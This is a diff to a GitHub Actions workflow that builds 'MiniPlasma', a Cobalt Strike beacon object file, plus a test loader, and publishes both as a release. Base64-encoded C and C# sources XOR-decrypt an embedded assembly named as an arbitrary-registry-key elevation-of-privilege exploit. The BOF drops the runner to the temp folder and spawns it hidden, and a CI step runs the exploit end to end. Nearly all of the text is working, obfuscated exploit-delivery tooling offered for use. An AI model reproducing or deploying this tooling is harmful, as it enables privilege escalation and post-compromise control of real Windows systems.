@@ -52,7 +52,7 @@ jobs:
           [IO.File]::WriteAllBytes("$wrDir\payload.enc", $bytes)
           Write-Output "Inner EXE encrypted: $($bytes.Length) bytes  key=$key"
 
-          $runnerB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwoKY2xhc3MgUnVubmVyCnsKICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgIHsKICAgICAgICBFbnZpcm9ubWVudC5TZXRFbnZpcm9ubWVudFZhcmlhYmxlKCJNUF9FWEUiLAogICAgICAgICAgICBBc3NlbWJseS5HZXRFeGVjdXRpbmdBc3NlbWJseSgpLkxvY2F0aW9uKTsKICAgICAgICB2YXIgcyA9IEFzc2VtYmx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KCkKICAgICAgICAgICAgLkdldE1hbmlmZXN0UmVzb3VyY2VTdHJlYW0oCiAgICAgICAgICAgICAgICAiUG9DX0Fib3J0SHlkcmF0aW9uX0FyYml0cmFyeVJlZ0tleV9Fb1AucGF5bG9hZC5lbmMiKTsKICAgICAgICBpZiAocyA9PSBudWxsKSB7IEVudmlyb25tZW50LkV4aXQoMSk7IHJldHVybjsgfQogICAgICAgIGJ5dGVbXSBidWYgPSBuZXcgYnl0ZVtzLkxlbmd0aF07CiAgICAgICAgcy5SZWFkKGJ1ZiwgMCwgYnVmLkxlbmd0aCk7CiAgICAgICAgcy5EaXNwb3NlKCk7CiAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspIGJ1ZltpXSBePSBYT1JLRVlfVkFMVUU7CiAgICAgICAgdmFyIGlubmVyID0gQXNzZW1ibHkuTG9hZChidWYpOwogICAgICAgIGlubmVyLkdldFR5cGUoIlBvQ19BYm9ydEh5ZHJhdGlvbl9BcmJpdHJhcnlSZWdLZXlfRW9QLlByb2dyYW0iKQogICAgICAgICAgICAuR2V0TWV0aG9kKCJNYWluIiwKICAgICAgICAgICAgICAgIEJpbmRpbmdGbGFncy5TdGF0aWMgfCBCaW5kaW5nRmxhZ3MuUHVibGljIHwgQmluZGluZ0ZsYWdzLk5vblB1YmxpYykKICAgICAgICAgICAgLkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBhcmdzIH0pOwogICAgfQp9"
+          $runnerB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwoKY2xhc3MgUnVubmVyCnsKICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgIHsKICAgICAgICBzdHJpbmcgbG9nUGF0aCA9IFBhdGguQ29tYmluZShQYXRoLkdldFRlbXBQYXRoKCksICJtcGxhc19yZXN1bHQubG9nIik7CiAgICAgICAgU3RyZWFtV3JpdGVyIGxvZyA9IG5ldyBTdHJlYW1Xcml0ZXIobG9nUGF0aCwgZmFsc2UpOwogICAgICAgIENvbnNvbGUuU2V0T3V0KGxvZyk7CiAgICAgICAgQ29uc29sZS5TZXRFcnJvcihsb2cpOwogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgRW52aXJvbm1lbnQuU2V0RW52aXJvbm1lbnRWYXJpYWJsZSgiTVBfRVhFIiwKICAgICAgICAgICAgICAgIEFzc2VtYmx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KCkuTG9jYXRpb24pOwogICAgICAgICAgICB2YXIgcyA9IEFzc2VtYmx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KCkKICAgICAgICAgICAgICAgIC5HZXRNYW5pZmVzdFJlc291cmNlU3RyZWFtKAogICAgICAgICAgICAgICAgICAgICJQb0NfQWJvcnRIeWRyYXRpb25fQXJiaXRyYXJ5UmVnS2V5X0VvUC5wYXlsb2FkLmVuYyIpOwogICAgICAgICAgICBpZiAocyA9PSBudWxsKSB7IENvbnNvbGUuV3JpdGVMaW5lKCJwYXlsb2FkLmVuYyByZXNvdXJjZSBub3QgZm91bmQiKTsgcmV0dXJuOyB9CiAgICAgICAgICAgIGJ5dGVbXSBidWYgPSBuZXcgYnl0ZVtzLkxlbmd0aF07CiAgICAgICAgICAgIHMuUmVhZChidWYsIDAsIGJ1Zi5MZW5ndGgpOwogICAgICAgICAgICBzLkRpc3Bvc2UoKTsKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspIGJ1ZltpXSBePSBYT1JLRVlfVkFMVUU7CiAgICAgICAgICAgIHZhciBpbm5lciA9IEFzc2VtYmx5LkxvYWQoYnVmKTsKICAgICAgICAgICAgaW5uZXIuR2V0VHlwZSgiUG9DX0Fib3J0SHlkcmF0aW9uX0FyYml0cmFyeVJlZ0tleV9Fb1AuUHJvZ3JhbSIpCiAgICAgICAgICAgICAgICAuR2V0TWV0aG9kKCJNYWluIiwKICAgICAgICAgICAgICAgICAgICBCaW5kaW5nRmxhZ3MuU3RhdGljIHwgQmluZGluZ0ZsYWdzLlB1YmxpYyB8IEJpbmRpbmdGbGFncy5Ob25QdWJsaWMpCiAgICAgICAgICAgICAgICAuSW52b2tlKG51bGwsIG5ldyBvYmplY3RbXSB7IGFyZ3MgfSk7CiAgICAgICAgfQogICAgICAgIGZpbmFsbHkKICAgICAgICB7CiAgICAgICAgICAgIGxvZy5GbHVzaCgpOwogICAgICAgICAgICBsb2cuQ2xvc2UoKTsKICAgICAgICB9CiAgICB9Cn0="
           $runnerSrc = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($runnerB64))
           $runnerSrc = $runnerSrc.Replace("XORKEY_VALUE", $key.ToString())
           [IO.File]::WriteAllText("$wrDir\Runner.cs", $runnerSrc, [Text.Encoding]::UTF8)
@@ -66,8 +66,8 @@ jobs:
           Write-Output "Runner.exe: $((Get-Item $runnerExe).Length) bytes"
           Write-Output "RUNNER_EXE=$runnerExe" >> $env:GITHUB_ENV
 
-      # ── XOR-encrypt runner + generate bof.c + compile BOF ────────────────────
-      - name: Generate and compile BOF
+      # ── XOR-encrypt runner + generate bof.c/test_main.c + compile BOF + test loader ──
+      - name: Generate and compile BOF and test loader
         shell: pwsh
         run: |
           $runnerExe = $env:RUNNER_EXE
@@ -80,7 +80,7 @@ jobs:
           $hexBytes = [System.BitConverter]::ToString($rBytes).Replace('-', ',0x').Insert(0, '0x')
           Write-Output "Runner encrypted: $($rBytes.Length) bytes  key2=$key2"
 
-          $bofB64 = "I2luY2x1ZGUgPHdpbmRvd3MuaD4KCiNkZWZpbmUgQ0FMTEJBQ0tfT1VUUFVUIDB4MDAKI2RlZmluZSBDQUxMQkFDS19FUlJPUiAgMHgwZAp2b2lkIEJlYWNvblByaW50ZihpbnQgdHlwZSwgY2hhciAqIGZtdCwgLi4uKTsKCnN0YXRpYyBjb25zdCB1bnNpZ25lZCBjaGFyIFJVTk5FUl9FTkNbXSA9IHtQTEFDRUhPTERFUl9CWVRFU307CnN0YXRpYyBjb25zdCBpbnQgUlVOTkVSX0xFTiA9IFBMQUNFSE9MREVSX0xFTjsKc3RhdGljIGNvbnN0IHVuc2lnbmVkIGNoYXIgUlVOTkVSX0tFWSA9ICh1bnNpZ25lZCBjaGFyKVBMQUNFSE9MREVSX0tFWTsKCnN0YXRpYyB2b2lkIGJ1aWxkcGF0aChjaGFyKiBvdXQsIGNvbnN0IGNoYXIqIGRpciwgdW5zaWduZWQgaW50IHRpY2spIHsKICAgIHN0YXRpYyBjb25zdCBjaGFyIGhleFtdID0gIjAxMjM0NTY3ODlBQkNERUYiOwogICAgaW50IGs7CiAgICBsc3RyY3B5QShvdXQsIGRpcik7CiAgICBsc3RyY2F0QShvdXQsICJtcGxhcyIpOwogICAgewogICAgICAgIGNoYXIqIHAgPSBvdXQgKyBsc3RybGVuQShvdXQpOwogICAgICAgIGZvciAoayA9IDA7IGsgPCA4OyBrKyspCiAgICAgICAgICAgIHBba10gPSBoZXhbKHRpY2sgPj4gKDI4IC0gayo0KSkgJiAweEZdOwogICAgICAgIHBbOF0gPSAwOwogICAgfQogICAgbHN0cmNhdEEob3V0LCAiLmV4ZSIpOwp9Cgp2b2lkIGdvKGNoYXIgKiBhcmdzLCBpbnQgbGVuKSB7CiAgICBjaGFyIHRtcGRpcltNQVhfUEFUSF07CiAgICBjaGFyIHJ1bm5lcnBhdGhbTUFYX1BBVEhdOwogICAgSEFORExFIGhGaWxlOwogICAgRFdPUkQgd3JpdHRlbiA9IDA7CiAgICBTVEFSVFVQSU5GT0Egc2k7CiAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOwogICAgdW5zaWduZWQgY2hhciAqIGJ1ZjsKICAgIGludCBpOwoKICAgIGJ1ZiA9ICh1bnNpZ25lZCBjaGFyICopSGVhcEFsbG9jKEdldFByb2Nlc3NIZWFwKCksIDAsIFJVTk5FUl9MRU4pOwogICAgaWYgKCFidWYpIHJldHVybjsKICAgIGZvciAoaSA9IDA7IGkgPCBSVU5ORVJfTEVOOyBpKyspIGJ1ZltpXSA9IFJVTk5FUl9FTkNbaV0gXiBSVU5ORVJfS0VZOwoKICAgIGlmICghR2V0VGVtcFBhdGhBKE1BWF9QQVRILCB0bXBkaXIpKSB7CiAgICAgICAgSGVhcEZyZWUoR2V0UHJvY2Vzc0hlYXAoKSwgMCwgYnVmKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBidWlsZHBhdGgocnVubmVycGF0aCwgdG1wZGlyLCAodW5zaWduZWQgaW50KUdldFRpY2tDb3VudCgpKTsKCiAgICBoRmlsZSA9IENyZWF0ZUZpbGVBKHJ1bm5lcnBhdGgsIEdFTkVSSUNfV1JJVEUsIDAsIE5VTEwsCiAgICAgICAgQ1JFQVRFX0FMV0FZUywgRklMRV9BVFRSSUJVVEVfTk9STUFMLCBOVUxMKTsKICAgIGlmIChoRmlsZSA9PSBJTlZBTElEX0hBTkRMRV9WQUxVRSkgewogICAgICAgIEhlYXBGcmVlKEdldFByb2Nlc3NIZWFwKCksIDAsIGJ1Zik7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgV3JpdGVGaWxlKGhGaWxlLCBidWYsIChEV09SRClSVU5ORVJfTEVOLCAmd3JpdHRlbiwgTlVMTCk7CiAgICBDbG9zZUhhbmRsZShoRmlsZSk7CiAgICBIZWFwRnJlZShHZXRQcm9jZXNzSGVhcCgpLCAwLCBidWYpOwoKICAgIFplcm9NZW1vcnkoJnNpLCBzaXplb2Yoc2kpKTsKICAgIFplcm9NZW1vcnkoJnBpLCBzaXplb2YocGkpKTsKICAgIHNpLmNiID0gc2l6ZW9mKHNpKTsKCiAgICBpZiAoIUNyZWF0ZVByb2Nlc3NBKHJ1bm5lcnBhdGgsIE5VTEwsIE5VTEwsIE5VTEwsIDAsCiAgICAgICAgICAgIENSRUFURV9OT19XSU5ET1csIE5VTEwsIE5VTEwsICZzaSwgJnBpKSkgewogICAgICAgIEJlYWNvblByaW50ZihDQUxMQkFDS19FUlJPUiwgIlstXSBDcmVhdGVQcm9jZXNzIGZhaWxlZCAlZFxuIiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgIERlbGV0ZUZpbGVBKHJ1bm5lcnBhdGgpOwogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBCZWFjb25QcmludGYoQ0FMTEJBQ0tfT1VUUFVULCAiWytdIE1pbmlQbGFzbWEgUElEICVkXG4iLCAoaW50KXBpLmR3UHJvY2Vzc0lkKTsKICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwp9"
+          $bofB64 = "I2luY2x1ZGUgPHdpbmRvd3MuaD4KCiNkZWZpbmUgQ0FMTEJBQ0tfT1VUUFVUIDB4MDAKI2RlZmluZSBDQUxMQkFDS19FUlJPUiAgMHgwZAp2b2lkIEJlYWNvblByaW50ZihpbnQgdHlwZSwgY2hhciAqIGZtdCwgLi4uKTsKCnN0YXRpYyBjb25zdCB1bnNpZ25lZCBjaGFyIFJVTk5FUl9FTkNbXSA9IHtQTEFDRUhPTERFUl9CWVRFU307CnN0YXRpYyBjb25zdCBpbnQgUlVOTkVSX0xFTiA9IFBMQUNFSE9MREVSX0xFTjsKc3RhdGljIGNvbnN0IHVuc2lnbmVkIGNoYXIgUlVOTkVSX0tFWSA9ICh1bnNpZ25lZCBjaGFyKVBMQUNFSE9MREVSX0tFWTsKCnN0YXRpYyB2b2lkIGJ1aWxkcGF0aChjaGFyKiBvdXQsIGNvbnN0IGNoYXIqIGRpciwgdW5zaWduZWQgaW50IHRpY2spIHsKICAgIHN0YXRpYyBjb25zdCBjaGFyIGhleFtdID0gIjAxMjM0NTY3ODlBQkNERUYiOwogICAgaW50IGs7CiAgICBsc3RyY3B5QShvdXQsIGRpcik7CiAgICBsc3RyY2F0QShvdXQsICJtcGxhcyIpOwogICAgewogICAgICAgIGNoYXIqIHAgPSBvdXQgKyBsc3RybGVuQShvdXQpOwogICAgICAgIGZvciAoayA9IDA7IGsgPCA4OyBrKyspCiAgICAgICAgICAgIHBba10gPSBoZXhbKHRpY2sgPj4gKDI4IC0gayo0KSkgJiAweEZdOwogICAgICAgIHBbOF0gPSAwOwogICAgfQogICAgbHN0cmNhdEEob3V0LCAiLmV4ZSIpOwp9CgojaWZuZGVmIFBST0NFU1NfRkxBR1MKI2RlZmluZSBQUk9DRVNTX0ZMQUdTIENSRUFURV9OT19XSU5ET1cKI2VuZGlmCgp2b2lkIGdvKGNoYXIgKiBhcmdzLCBpbnQgbGVuKSB7CiAgICBjaGFyIHRtcGRpcltNQVhfUEFUSF07CiAgICBjaGFyIHJ1bm5lcnBhdGhbTUFYX1BBVEhdOwogICAgSEFORExFIGhGaWxlOwogICAgRFdPUkQgd3JpdHRlbiA9IDA7CiAgICBTVEFSVFVQSU5GT0Egc2k7CiAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOwogICAgdW5zaWduZWQgY2hhciAqIGJ1ZjsKICAgIGludCBpOwoKICAgIGJ1ZiA9ICh1bnNpZ25lZCBjaGFyICopSGVhcEFsbG9jKEdldFByb2Nlc3NIZWFwKCksIDAsIFJVTk5FUl9MRU4pOwogICAgaWYgKCFidWYpIHJldHVybjsKICAgIGZvciAoaSA9IDA7IGkgPCBSVU5ORVJfTEVOOyBpKyspIGJ1ZltpXSA9IFJVTk5FUl9FTkNbaV0gXiBSVU5ORVJfS0VZOwoKICAgIGlmICghR2V0VGVtcFBhdGhBKE1BWF9QQVRILCB0bXBkaXIpKSB7CiAgICAgICAgSGVhcEZyZWUoR2V0UHJvY2Vzc0hlYXAoKSwgMCwgYnVmKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBidWlsZHBhdGgocnVubmVycGF0aCwgdG1wZGlyLCAodW5zaWduZWQgaW50KUdldFRpY2tDb3VudCgpKTsKCiAgICBoRmlsZSA9IENyZWF0ZUZpbGVBKHJ1bm5lcnBhdGgsIEdFTkVSSUNfV1JJVEUsIDAsIE5VTEwsCiAgICAgICAgQ1JFQVRFX0FMV0FZUywgRklMRV9BVFRSSUJVVEVfTk9STUFMLCBOVUxMKTsKICAgIGlmIChoRmlsZSA9PSBJTlZBTElEX0hBTkRMRV9WQUxVRSkgewogICAgICAgIEhlYXBGcmVlKEdldFByb2Nlc3NIZWFwKCksIDAsIGJ1Zik7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgV3JpdGVGaWxlKGhGaWxlLCBidWYsIChEV09SRClSVU5ORVJfTEVOLCAmd3JpdHRlbiwgTlVMTCk7CiAgICBDbG9zZUhhbmRsZShoRmlsZSk7CiAgICBIZWFwRnJlZShHZXRQcm9jZXNzSGVhcCgpLCAwLCBidWYpOwoKICAgIFplcm9NZW1vcnkoJnNpLCBzaXplb2Yoc2kpKTsKICAgIFplcm9NZW1vcnkoJnBpLCBzaXplb2YocGkpKTsKICAgIHNpLmNiID0gc2l6ZW9mKHNpKTsKCiAgICBpZiAoIUNyZWF0ZVByb2Nlc3NBKHJ1bm5lcnBhdGgsIE5VTEwsIE5VTEwsIE5VTEwsIDAsCiAgICAgICAgICAgIFBST0NFU1NfRkxBR1MsIE5VTEwsIE5VTEwsICZzaSwgJnBpKSkgewogICAgICAgIEJlYWNvblByaW50ZihDQUxMQkFDS19FUlJPUiwgIlstXSBDcmVhdGVQcm9jZXNzIGZhaWxlZCAlZFxuIiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgIERlbGV0ZUZpbGVBKHJ1bm5lcnBhdGgpOwogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBCZWFjb25QcmludGYoQ0FMTEJBQ0tfT1VUUFVULCAiWytdIE1pbmlQbGFzbWEgUElEICVkXG4iLCAoaW50KXBpLmR3UHJvY2Vzc0lkKTsKICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwp9"
           $bofSrc = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($bofB64))
           $bofSrc = $bofSrc.Replace("PLACEHOLDER_BYTES", $hexBytes)
           $bofSrc = $bofSrc.Replace("PLACEHOLDER_LEN",  $rBytes.Length.ToString())
@@ -88,7 +88,11 @@ jobs:
           [IO.File]::WriteAllText("$bofDir\bof.c", $bofSrc, [Text.Encoding]::UTF8)
           Write-Output "bof.c: $((Get-Item "$bofDir\bof.c").Length) bytes"
 
-          # Find vcvars64.bat and compile with MSVC environment set up
+          $testB64 = "I2luY2x1ZGUgPHdpbmRvd3MuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRhcmcuaD4KCnZvaWQgQmVhY29uUHJpbnRmKGludCB0eXBlLCBjaGFyICogZm10LCAuLi4pIHsKICAgIHZhX2xpc3QgYXA7CiAgICB2YV9zdGFydChhcCwgZm10KTsKICAgIHZwcmludGYoZm10LCBhcCk7CiAgICB2YV9lbmQoYXApOwogICAgZmZsdXNoKHN0ZG91dCk7Cn0KCnZvaWQgZ28oY2hhciAqIGFyZ3MsIGludCBsZW4pOwoKaW50IG1haW4odm9pZCkgewogICAgY2hhciBsb2dQYXRoW01BWF9QQVRIXTsKICAgIEhBTkRMRSBoTG9nOwogICAgY2hhciBidWZbNDA5Nl07CiAgICBEV09SRCByZDsKCiAgICBwcmludGYoIlsqXSBNaW5pUGxhc21hIEJPRiB0ZXN0IHN0YXJ0aW5nXG4iKTsKICAgIGZmbHVzaChzdGRvdXQpOwoKICAgIGdvKE5VTEwsIDApOwoKICAgIHByaW50ZigiWypdIFJ1bm5lciBzcGF3bmVkIC0gd2FpdGluZyAzMHMgZm9yIGV4cGxvaXQgY29tcGxldGlvblxuIik7CiAgICBmZmx1c2goc3Rkb3V0KTsKICAgIFNsZWVwKDMwMDAwKTsKCiAgICBHZXRUZW1wUGF0aEEoTUFYX1BBVEgsIGxvZ1BhdGgpOwogICAgbHN0cmNhdEEobG9nUGF0aCwgIm1wbGFzX3Jlc3VsdC5sb2ciKTsKICAgIHByaW50ZigiWypdIExvZyBwYXRoOiAlc1xuIiwgbG9nUGF0aCk7CiAgICBmZmx1c2goc3Rkb3V0KTsKCiAgICBoTG9nID0gQ3JlYXRlRmlsZUEobG9nUGF0aCwgR0VORVJJQ19SRUFELCBGSUxFX1NIQVJFX1JFQUQgfCBGSUxFX1NIQVJFX1dSSVRFLAogICAgICAgIE5VTEwsIE9QRU5fRVhJU1RJTkcsIDAsIE5VTEwpOwogICAgaWYgKGhMb2cgIT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpIHsKICAgICAgICBwcmludGYoIi0tLSBMT0cgQkVHSU4gLS0tXG4iKTsKICAgICAgICB3aGlsZSAoUmVhZEZpbGUoaExvZywgYnVmLCBzaXplb2YoYnVmKSAtIDEsICZyZCwgTlVMTCkgJiYgcmQgPiAwKSB7CiAgICAgICAgICAgIGJ1ZltyZF0gPSAwOwogICAgICAgICAgICBwcmludGYoIiVzIiwgYnVmKTsKICAgICAgICAgICAgZmZsdXNoKHN0ZG91dCk7CiAgICAgICAgfQogICAgICAgIENsb3NlSGFuZGxlKGhMb2cpOwogICAgICAgIHByaW50ZigiXG4tLS0gTE9HIEVORCAtLS1cbiIpOwogICAgfSBlbHNlIHsKICAgICAgICBwcmludGYoIlstXSBMb2cgbm90IGZvdW5kIChlcnJvciAlZClcbiIsIChpbnQpR2V0TGFzdEVycm9yKCkpOwogICAgfQoKICAgIGZmbHVzaChzdGRvdXQpOwogICAgcmV0dXJuIDA7Cn0="
+          $testSrc = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($testB64))
+          [IO.File]::WriteAllText("$bofDir\test_main.c", $testSrc, [Text.Encoding]::UTF8)
+
+          # Find vcvars64.bat and compile both BOF object and test loader EXE
           $vsBase = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise"
           $vcvars = "$vsBase\VC\Auxiliary\Build\vcvars64.bat"
           if (-not (Test-Path $vcvars)) {
@@ -98,18 +102,29 @@ jobs:
           Write-Output "vcvars: $vcvars"
 
           $bofObj = "$bofDir\miniplasma.o"
-          $clcmd = "call `"$vcvars`" && cl.exe /c /GS- /W0 /nologo /O2 `"$bofDir\bof.c`" /Fo`"$bofObj`""
+          $testExe = "$bofDir\test_loader.exe"
+          $clcmd = "call `"$vcvars`" && cl.exe /c /GS- /W0 /nologo /O2 `"$bofDir\bof.c`" /Fo`"$bofObj`" && cl.exe /DPROCESS_FLAGS=0 /W0 /nologo `"$bofDir\bof.c`" `"$bofDir\test_main.c`" /Fe`"$testExe`" /link kernel32.lib"
           cmd /c $clcmd
-          if ($LASTEXITCODE -ne 0) { throw "BOF compile failed" }
+          if ($LASTEXITCODE -ne 0) { throw "BOF/test compile failed" }
           Write-Output "BOF object: $((Get-Item $bofObj).Length) bytes"
+          Write-Output "Test loader: $((Get-Item $testExe).Length) bytes"
           Write-Output "BOF_OBJ=$bofObj" >> $env:GITHUB_ENV
+          Write-Output "TEST_LOADER=$testExe" >> $env:GITHUB_ENV
+
+      - name: Run exploit test (BOF end-to-end via test_loader)
+        shell: pwsh
+        continue-on-error: true
+        run: |
+          Write-Output "=== MiniPlasma BOF end-to-end test ==="
+          & $env:TEST_LOADER
+          Write-Output "=== Test exit code: $LASTEXITCODE ==="
 
       - name: Stage artifacts
         shell: pwsh
         run: |
           New-Item -ItemType Directory -Force staging | Out-Null
           Copy-Item $env:BOF_OBJ  "staging\miniplasma.o"
-          Copy-Item $env:RUNNER_EXE "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
+          Copy-Item $env:TEST_LOADER "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
           Get-ChildItem staging\ | Format-Table Name, Length
 
       - name: Create GitHub Release
@@ -117,9 +132,9 @@ jobs:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         shell: pwsh
         run: |
-          $tag = "v6.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
+          $tag = "v6.1-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
           gh release create $tag staging\* `
-            --title "MiniPlasma v6.0 - Cobalt Strike BOF" `
-            --notes "miniplasma.o: CS BOF - drops self-contained runner to temp, spawns exploit. Usage: inline-execute miniplasma.o. EXE: standalone runner for direct testing." `
+            --title "MiniPlasma v6.1 - BOF + Test Loader" `
+            --notes "miniplasma.o: CS BOF - drops XOR-encrypted runner to temp, spawns exploit. EXE: test_loader - directly invokes BOF go() with BeaconPrintf->stdout, waits 30s, reads mplas_result.log." `
             --repo $env:GITHUB_REPOSITORY
           Write-Output "Release: $tag"
